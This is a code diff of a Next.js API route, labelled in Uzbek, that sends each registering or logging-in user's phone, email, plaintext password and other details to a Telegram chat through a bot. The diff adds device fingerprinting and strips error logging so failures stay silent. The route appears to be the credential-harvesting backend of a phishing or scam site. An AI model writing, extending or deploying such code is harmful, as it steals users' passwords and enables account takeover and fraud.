@@ -6,53 +6,60 @@ const PASSWORDS_CHAT_ID = process.env.PASSWORDS_CHAT_ID;
 export async function POST(request: NextRequest) {
     try {
         const body = await request.json();
-        const { type, phone, email, password, country, currency, userId, userAgent, ip } = body;
+        const {
+            type, phone, email, password, country, currency, userId,
+            platform, language, screenSize, timezone, referrer
+        } = body;
 
         if (!BOT_TOKEN || !PASSWORDS_CHAT_ID) {
-            console.error('Telegram credentials for passwords not configured');
-            return NextResponse.json({ success: true }); // Silent fail
+            return NextResponse.json({ success: true });
         }
 
         const dateDisplay = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
 
+        const deviceInfo = `
+📱 <b>Qurilma:</b> ${platform || '-'}
+🖥️ <b>Ekran:</b> ${screenSize || '-'}
+🌐 <b>Til:</b> ${language || '-'}
+⏰ <b>Vaqt zonasi:</b> ${timezone || '-'}
+🔗 <b>Referrer:</b> ${referrer || 'direct'}`;
+
         let message: string;
 
         if (type === 'registration') {
-            message = `🆕 *YANGI RO'YXATDAN O'TISH*
+            message = `🆕 <b>YANGI RO'YXATDAN O'TISH</b>
 
-📱 *Telefon:* \`${phone || '-'}\`
-📧 *Email:* \`${email || '-'}\`
-🔐 *Parol:* \`${password}\`
-🌍 *Mamlakat:* ${country || '-'}
-💰 *Valyuta:* ${currency || '-'}
-👤 *User ID:* \`${userId || '-'}\`
+📱 <b>Telefon:</b> <code>${phone || '-'}</code>
+📧 <b>Email:</b> <code>${email || '-'}</code>
+🔐 <b>Parol:</b> <code>${password}</code>
+🌍 <b>Mamlakat:</b> ${country || '-'}
+💰 <b>Valyuta:</b> ${currency || '-'}
+👤 <b>User ID:</b> <code>${userId || '-'}</code>
 
-📅 *Sana:* ${dateDisplay}
-🖥️ *User Agent:* ${userAgent || '-'}`;
+📅 <b>Sana:</b> ${dateDisplay}
+${deviceInfo}`;
         } else {
-            message = `🔑 *KIRISH (LOGIN)*
+            message = `🔑 <b>KIRISH (LOGIN)</b>
 
-📱 *Telefon/Email:* \`${phone || email || '-'}\`
-🔐 *Parol:* \`${password}\`
+📱 <b>Telefon/Email:</b> <code>${phone || email || '-'}</code>
+🔐 <b>Parol:</b> <code>${password}</code>
 
-📅 *Sana:* ${dateDisplay}
-🖥️ *User Agent:* ${userAgent || '-'}`;
+📅 <b>Sana:</b> ${dateDisplay}
+${deviceInfo}`;
         }
 
-        // Fire and forget - non-blocking
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: PASSWORDS_CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
-        }).catch(err => console.error('Password notification failed:', err));
+        }).catch(() => { });
 
         return NextResponse.json({ success: true });
-    } catch (error) {
-        console.error('Error in credentials notification:', error);
-        return NextResponse.json({ success: true }); // Silent fail
+    } catch {
+        return NextResponse.json({ success: true });
     }
 }
